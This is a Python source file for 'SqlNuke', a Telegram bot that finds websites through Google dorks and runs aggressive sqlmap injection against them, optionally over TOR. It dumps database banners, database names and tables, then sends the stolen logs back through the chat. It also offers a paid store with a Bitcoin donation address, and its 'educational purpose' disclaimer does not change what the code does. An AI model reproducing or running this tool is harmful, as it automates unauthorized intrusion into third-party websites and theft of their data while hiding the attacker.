#!/usr/bin/python
# -*- coding: utf-8 -*-
import time
import subprocess
import telepot
import os
import urllib2
import re
import socket
import datetime
import threading
from urllib2 import urlopen
from alexa import Alexa
from config import token_id


banner = '''
        \xF0\x9F\x9A\x80Welcome to SqlNuke\xF0\x9F\x9A\x80
       \xF0\x9F\x92\x89[Version v2.0]\xF0\x9F\x92\x89

       _.-._
      ({  ` )
       ` |''   *BooOOm!*
    \xF0\x9F\x9A\x80
    \xF0\x9F\x92\xA5\xF0\x9F\x92\xA5
\xF0\x9F\x92\xA3\xF0\x9F\x92\xA3\xF0\x9F\x92\xA3\xF0\x9F\x92\xA3

-\xF0\x9F\x93\x9A Author  : Abhisek Kumar [netwrkspider]
-\xF0\x9F\x93\xAA Email   : netwrkspider@protonmail.ch
-\xF0\x9F\x8C\x8D Website : http://www.netwrkspider.org

Select the option :: `/help`

---------------------------------------------

'''
menu = '''
\xF0\x9F\x9A\xA5 \xF0\x9F\x9A\xA5 OPTIONAL \xF0\x9F\x9A\xA5 \xF0\x9F\x9A\xA5
6.  `/getdorklist` - Download the latest DorkList Data.
7.  `/torstart` - Start the TOR Network.
8.  `/torstop` - Stop the TOR Network.
9.  `/sqlidata` - Download the all SQLi Data.
10. `/meminfo` - Check the memory utilization.
11. `/cpuloadinfo` - Check the CPU Utilization.
12. `/checksqli`   - Check SQLi Running Process.
13. `/killsqli` - Kill all the sqli Running Process.
14. `/buy` - SQLnuKe Store.
'''

def nuke(msg):
        chat_id = msg['chat']['id']
        command = msg['text']

        print "Got Command : %s " %command
        #bot.sendMessage(chat_id, str(banner))
	
	#welcome screen and help
	if command.startswith('help') or command.startswith('/help') or command.startswith('/start'):
        	bot.sendMessage(chat_id, str(banner))
		bot.sendMessage(chat_id,'\xF0\x9F\x94\x90 SQLnuKe MENU: ')
		bot.sendMessage(chat_id,'1. [nukedork] Search the SQLi \xF0\x9F\x92\x89 | Usage eg: -> nukedork index.php?id=1\n')
		bot.sendMessage(chat_id,'2. [sqlgdork] Search the SQLi \xF0\x9F\x92\x89 with Goole| Usage eg: -> sqlgdork about.php?id=1\n')
		bot.sendMessage(chat_id,'3. [sqlihack] Perform the SQLi \xF0\x9F\x92\x89 without TOR | Usage eg: -> sqlihack http|https://<url>\n')
		bot.sendMessage(chat_id,'4. [sqlitor]  Perform the SQLi \xF0\x9F\x92\x89 with TOR | Usage eg: -> sqlitor http|https://<url>\n')
		bot.sendMessage(chat_id,'5. BTC Rate : example -> btc usd or btc anycurrency')
		bot.sendMessage(chat_id, str(menu))
		return 0
	#end welcome
	def runoscmd(cmd):
		process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		output = process.stdout.read()
		error = process.stderr.read()
		process.stdout.close()
		process.wait()
		if error:
			return None
		return output

	def getMemoryInfo():
		output = runoscmd("`which free` -m")
		if output:
			memory_line = output.split("\n")[1].split()
			total_mem = "%s MB" % (memory_line[1])
			mem_used_value = "%s MB" % (memory_line[2])
			mem_free_value = "%s MB" % (memory_line[3])
			mem_used_percent = ("%.2f%s") % (((float(memory_line[2]) / float(memory_line[1])) * 100),"%")
			headers = ["total","used","free","used %"]
			values = [total_mem,mem_used_value,mem_free_value,mem_used_percent]
			return dict(zip(headers,values))
		else:
			return None
	
	def getLoadAverage():
		dict_headers = ["1min","5min","15min"]
		loadAverages = [("%.2f" % a) for a in os.getloadavg()]
		return dict(zip(dict_headers,loadAverages))

	def checkSqliProcess():
		process = subprocess.Popen("ps -eopid,cmd | grep 'sqlmap'" , shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		output = process.stdout.read()
                error = process.stderr.read()
                process.stdout.close()
                process.wait()
                if error:
                        return None
                return output

	def killsqliProcess():
		process = subprocess.Popen("ps aux | grep 'sqlmap' | awk '{print $2}' | xargs kill -9", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		output = process.stdout.read()
                error = process.stderr.read()
                process.stdout.close()
                process.wait()
                if error:
                        return None
                return 0
	def help():
		bot.sendMessage(chat_id, str("\xF0\x9F\x9A\xA5HELP MENU: `/help`\xF0\x9F\x9A\xA5"))

	def sqligoogle(dorkstring):
		sqligoogledork = "sqlmap -v 2 -g %s --user-agent=Windows --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --v --batch --level=5 --risk=3 --banner --is-dba --dbs --tables --technique=BEUST --output-dir=data/sqldump/" % dorkstring
		bot.sendMessage(chat_id, str("\xF0\x9F\x95\x97 please wait while we are doing SQLi \xF0\x9F\x92\x89"))
                subprocess.Popen(sqligoogledork.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		print(time.ctime())
    		#threading.Timer(60, sqligoogle).start()
		bot.sendMessage(chat_id, "We are doing SQLi \xF0\x9F\x92\x89 in background! ")
		bot.sendMessage(chat_id, "If you want to download the sqli \xF0\x9F\x92\x89 report for SQLi Sites, Please Execute : `/sqlidata` ")
                #subprocess.check_call(sqligoogledork.split())
	if command.startswith('sqlgdork') or command.startswith('Sqlgdork'):
		sqligargu=command[9:]
		sqligoogle(sqligargu)
		help()
		return 0
	
	elif command == '/sqlidata':
		for file in os.listdir("data/sqldump"):
			if file.endswith(".csv"):
				if os.stat('data/sqldump/%s' % file).st_size!=0:
					#bot.sendDocument(chat_id, document=open("data/googledork/%s" % file, 'rb'))
					#print file
					pass
				else:
					pass
				#print file
			else:
				if os.stat('data/sqldump/%s/log' % file).st_size!=0:
			 		bot.sendMessage(chat_id, "Website SQLi \xF0\x9F\x92\x89 data for : %s" %file)
					print file
					#ranker = Alexa()
                                	#site_rank = ranker.getrank('%s' % file)
                                	#bot.sendMessage(chat_id, str("\xF0\x9F\x8C\x8E Alexa Rank: %s" %site_rank))
			 		bot.sendDocument(chat_id, document=open("data/sqldump/%s/log" % file, 'rb'))
				else:
					bot.sendMessage(chat_id, "Sorry we haven't found any SQLi \xF0\x9F\x92\x89 on : %s" %file )
		help()

    #btc price
	elif command.startswith('btc') or command.startswith('Btc'):
			arg1=command[4:]
			print arg1
			url= "https://www.google.co.in/search?q=bitcoin+to+"+arg1
			req = urllib2.Request(url, headers={'User-Agent' : "Magic Browser"}) 
			con = urllib2.urlopen( req )
			Text=con.read()
			position=re.search("1 Bitcoin =",Text)
			res = float(Text[position.end():position.end()+9])
			axx = '1 BTC : '+str(res)+' '+arg1
			bot.sendMessage(chat_id,str(axx))
			help()
			return 0
	#end btc price
    #sqlidork
	elif command.startswith('nukedork') or command.startswith('Nukedork'):
			argu=command[9:]
			print argu
			print command
        		fdork = open("data/dorklist/userdorklist.txt","a+")
        		fdork.write("%s\n" % argu)
        		fdork.close()
        		sqldorkengine = "./sqlnukedork %s " % argu
        		bot.sendMessage(chat_id, str("\xF0\x9F\x95\x97 please wait while we are generating the report.. \xF0\x9F\x95\x97"))
        		subprocess.check_call(sqldorkengine.split())
        		bot.sendDocument(chat_id, document=open('sitedata.txt', 'rb'))
        		bot.sendMessage(chat_id, str("Transfer completed!\xF0\x9F\x9A\x80"))
        		os.remove("sitedata.txt")
			help()
			return 0
	#end sqlidork
     #sqlihack
	elif command.startswith('sqlihackoldsgshyehshshs') or command.startswith('Sqlihackoldgshsgatysgsgs'):
			sqliargu=command[9:]
			print sqliargu
			sqlmatch = re.search(r"^(http|https)://.*$", sqliargu)
			if sqlmatch:
				sqlinjection = "python sqlmap/sqlmap.py  -v 2 --url=%s --user-agent=Windows --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --v --batch --dbms=MySQL --os=Linux --level=5 --risk=3 --banner --is-dba --dbs --tables --technique=BEUST --output-dir=data/" % sqliargu
        			f = open("data/dorklist/urldata.txt","a+")
        			f.write("%s\n" % sqliargu)
        			f.close()
        			bot.sendMessage(chat_id, str("\xF0\x9F\x95\x97 please wait while we are doing SQLi \xF0\x9F\x92\x89"))
        			subprocess.check_call(sqlinjection.split())
        			dirfilter = sqliargu
        			dirpath=re.search("http://*([^/]+)|https://*([^/]+)", dirfilter)
        			if dirfilter.startswith('https'):
					sqllogpath = dirpath.group(2)
				else:
					sqllogpath = dirpath.group(1)
        			bot.sendMessage(chat_id, str("Generating SQL injection Report for %s" %sqllogpath))
        			bot.sendDocument(chat_id, document=open("data/%s/log" %sqllogpath , 'rb'))
        			bot.sendMessage(chat_id, str("Transfer completed!\xF0\x9F\x9A\x80"))
        			bot.sendMessage(chat_id, str("Please wait while we are gathering Alexa Rank..\xF0\x9F\x95\x97"))
        			ranker = Alexa()
        			site_rank = ranker.getrank('%s' % sqllogpath)
        			bot.sendMessage(chat_id, str("\xF0\x9F\x8C\x8E Alexa Rank: %s" %site_rank))
			else:
				bot.sendMessage(chat_id, "\xE2\x9D\x8C Incorrect Command \xE2\x9D\x8C | Usage eg: -> sqlihack http|https://<url>")
			return 0

	#end sqlihack
	elif command.startswith('sqlihack') or command.startswith('Sqlihack'):
			sqliargu=command[9:]
                        print sqliargu
                        sqlmatch = re.search(r"^(http|https)://.*$", sqliargu)
			if sqlmatch:
                                sqlinjection = "sqlmap -v 2 --url=%s --user-agent=Windows --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --v --batch --level=5 --risk=3 --banner --is-dba --dbs --tables --technique=BEUST --output-dir=data/sqldump/" % sqliargu
                                f = open("data/dorklist/urldata.txt","a+")
                                f.write("%s\n" % sqliargu)
                                f.close()
				subprocess.Popen(sqlinjection.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                		bot.sendMessage(chat_id, "We are doing SQLi \xF0\x9F\x92\x89 in background! ")
                		bot.sendMessage(chat_id, "If you want to download the sqli \xF0\x9F\x92\x89 report for sqlidata , Please Execute : `/sqlidata` ")
				help()
				dirfilter = sqliargu
                                dirpath=re.search("http://*([^/]+)|https://*([^/]+)", dirfilter)
				if dirfilter.startswith('https'):
                                        sqllogpath = dirpath.group(2)
                                else:
                                        sqllogpath = dirpath.group(1)
				#bot.sendMessage(chat_id, str("Please wait while we are gathering Alexa Rank..\xF0\x9F\x95\x97"))
                                #ranker = Alexa()
                                #site_rank = ranker.getrank('%s' % sqllogpath)
                                #bot.sendMessage(chat_id, str("\xF0\x9F\x8C\x8E Alexa Rank: %s" %site_rank))
			else:
                                bot.sendMessage(chat_id, "\xE2\x9D\x8C Incorrect Command \xE2\x9D\x8C | Usage eg: -> sqlihack http|https://<url>")
				help()
                        return 0
#sqlihacktor
	elif command.startswith('sqlitor') or command.startswith('Sqlitor'):
                        sqliargutor=command[8:]
                        print sqliargutor
                        sqlmatchtor = re.search(r"^(http|https)://.*$", sqliargutor)
                        if sqlmatchtor:
                                sqlinjectiontor = "sqlmap -v 2 --tor --tor-type=SOCKS5 --url=%s --user-agent=Windows --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --v --batch --level=5 --risk=3 --banner --is-dba --dbs --tables --technique=BEUST --output-dir=data/sqldump/" % sqliargutor
                                f = open("data/dorklist/urldata.txt","a+")
                                f.write("%s\n" % sqliargutor)
                                f.close()
				bot.sendMessage(chat_id, str("Starting TOR Network."))
                                subprocess.check_call("service tor start".split())
                                subprocess.Popen(sqlinjectiontor.split(), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                                bot.sendMessage(chat_id, "We are doing SQLi \xF0\x9F\x92\x89 with TOR in background! ")
                                bot.sendMessage(chat_id, "If you want to download the sqli \xF0\x9F\x92\x89 report for sqlidata , Please Execute : `/sqlidata` ")
				help()
                        else:
                                bot.sendMessage(chat_id, "\xE2\x9D\x8C Incorrect Command \xE2\x9D\x8C | Usage eg: -> sqlitor http|https://<url>")
				help()
                        return 0

	elif command.startswith('sqlitoroldgshshshs') or command.startswith('Sqlitoroldtwgsshshsh'):
			sqliargutor=command[8:]
			print sqliargutor
			sqlmatchtor = re.search(r"^(http|https)://.*$", sqliargutor)
			if sqlmatchtor:
				sqlinjectiontor = "python sqlmap/sqlmap.py  -v 2 --tor --tor-type=SOCKS5 --url=%s --user-agent=Windows --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --v --batch --dbms=MySQL --os=Linux --level=5 --risk=3 --banner --is-dba --dbs --tables --technique=BEUST --output-dir=data/" % sqliargutor
        			ftor = open("data/dorklist/urldata.txt","a+")
        			ftor.write("%s\n" % sqliargutor)
        			ftor.close()
        			bot.sendMessage(chat_id, str("\xF0\x9F\x95\x97 please wait while we are doing SQLi \xF0\x9F\x92\x89"))
				bot.sendMessage(chat_id, str("Starting TOR Network."))
        			subprocess.check_call("service tor start".split())
        			subprocess.check_call(sqlinjectiontor.split())
        			dirfiltertor = sqliargutor
        			dirpathtor=re.search("http://*([^/]+)|https://*([^/]+)", dirfiltertor)
        			if dirfiltertor.startswith('https'):
					sqllogpathtor = dirpathtor.group(2)
				else:
					sqllogpathtor = dirpathtor.group(1)
        			bot.sendMessage(chat_id, str("Generating SQL injection Report for %s" %sqllogpathtor))
        			bot.sendDocument(chat_id, document=open("data/%s/log" %sqllogpathtor , 'rb'))
        			bot.sendMessage(chat_id, str("Transfer completed!\xF0\x9F\x9A\x80"))
        			bot.sendMessage(chat_id, str("Please wait while we are gathering Alexa Rank.."))
        			ranker = Alexa()
        			site_rank_tor = ranker.getrank('%s' % sqllogpathtor)
        			bot.sendMessage(chat_id, str("\xF0\x9F\x8C\x8E Alexa Rank: %s" %site_rank_tor))
			else:
				bot.sendMessage(chat_id, "\xE2\x9D\x8C Incorrect Command \xE2\x9D\x8C | Usage eg: -> sqlihacktor http|https://<url>")
			return 0

	#end sqlitor
#getdorklist
	elif command == '/getdorklist':
			bot.sendMessage(chat_id, str("Sending dorklist \xF0\x9F\x9A\x80"))
         		bot.sendDocument(chat_id, document=open("data/dorklist/dorklist.txt" , 'rb'))
        		bot.sendMessage(chat_id, str("Transfer completed!\xF0\x9F\x9A\x80"))
			help()
	#end getdorklist
	
	elif command == '/torstart':
         		bot.sendMessage(chat_id, str("Starting TOR Network.."))
         		subprocess.check_call("service tor start".split())
         		bot.sendMessage(chat_id, str("TOR Network started!\xE2\x9C\x94"))
			help()
    	elif command == '/torstop':
         		bot.sendMessage(chat_id, str("Shutting down TOR Network.."))
         		subprocess.check_call("service tor stop".split())
         		bot.sendMessage(chat_id, str("TOR Network stopped!\xE2\x9D\x8C"))
			help()
    	elif command == '/hackwolf':
         		bot.sendMessage(chat_id, str("Sending the latest dork data.."))
         		bot.sendDocument(chat_id, document=open('data/dorklist/userdorklist.txt', 'rb'))
         		bot.sendDocument(chat_id, document=open('data/dorklist/urldata.txt', 'rb'))
         		bot.sendMessage(chat_id, str("Transfer completed!\xF0\x9F\x9A\x80"))
	elif command == '/meminfo':
			mem_info = getMemoryInfo()
			bot.sendMessage(chat_id, str(mem_info))
			help()
	elif command == '/cpuloadinfo':
			cpu_info = getLoadAverage()
			bot.sendMessage(chat_id, str(cpu_info))
			help()
	elif command == '/checksqli':
			sqli_info = checkSqliProcess()
			bot.sendMessage(chat_id, str("PID | CMD"))
			bot.sendMessage(chat_id, str(sqli_info))
	elif command == '/killsqli':
			killsqliProcess()
			bot.sendMessage(chat_id, str("SQLi \xF0\x9F\x92\x89 Process has been killed!\xE2\x9D\x8C"))
			bot.sendMessage(chat_id, str("\xF0\x9F\x9A\xA5HELP MENU: `/help` | CHECK SQLi \xF0\x9F\x92\x89 : `/checksqli`\xF0\x9F\x9A\xA5"))
    	elif command == '/buy':
        		bot.sendMessage(chat_id, str("\xF0\x9F\x92\xB0 SQLNUKE  @ \xF0\x9F\x92\xB5 Educational & Research Purpose Only"))
        		bot.sendMessage(chat_id, str("\xF0\x9F\x93\xAB E-Mail : netwrkspider@protonmail.ch "))
        		bot.sendMessage(chat_id, str("\xF0\x9F\x92\xB5 Donation @ BTC Address:: 19rN13RDEhoZS7d2oc5wAQpGFZPhs6zbAA"))
			help()
	else:
		bot.sendMessage(chat_id,'\xF0\x9F\x93\x9F [+] Got Command \xF0\x9F\x93\x9F')
		bot.sendMessage(chat_id,command)
		bot.sendMessage(chat_id,'\xF0\x9F\x93\x9F  [-] Wait.....[-]')
		#aa=subprocess.check_output(command,shell=True)
		#bot.sendMessage(chat_id,aa)

	


#api credentials
bot = telepot.Bot('%s' % token_id)
bot.message_loop(nuke)
print 'welcome to SQLnuKe bot'
print 'Author : netwrkspider [http://www.netwrkspider.org]'
print 'SERVER IS Running'

while 1:
        time.sleep(10)
